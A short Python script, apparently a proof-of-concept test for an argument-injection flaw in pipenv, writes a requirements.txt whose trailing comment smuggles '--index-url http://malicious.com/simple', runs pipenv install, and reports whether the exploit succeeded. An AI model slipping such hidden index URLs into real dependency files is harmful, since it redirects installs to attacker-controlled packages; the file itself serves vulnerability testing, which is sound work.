import subprocess
import os
import logging

# Setup logging to file
log_file = 'aci_unit_test.log'
logging.basicConfig(filename=log_file, level=logging.DEBUG, format='%(asctime)s - %(levelname)s - %(message)s')

# Create a malicious requirements.txt with a hidden malicious index URL
requirements_content = """
# This is a comment
requests==2.25.1  # This is another comment --index-url http://malicious.com/simple
"""
with open('requirements.txt', 'w') as f:
    f.write(requirements_content)

# Attempt to install using pipenv, simulating the attack
try:
    logging.info("Starting pipenv install...")
    result = subprocess.run(['pipenv', 'install', '-r', 'requirements.txt'], capture_output=True, text=True, timeout=60)
    output = result.stdout + result.stderr
    logging.info("pipenv install completed.")
    if "http://malicious.com/simple" in output:
        print("The ACI exploit success!!!")
    else:
        print("The ACI exploit failed!!!")
except subprocess.TimeoutExpired:
    logging.error("The pipenv install command timed out.")
except Exception as e:
    logging.error("An error occurred during the pipenv install.")
    print("The ACI exploit failed!!!")
    print(str(e))
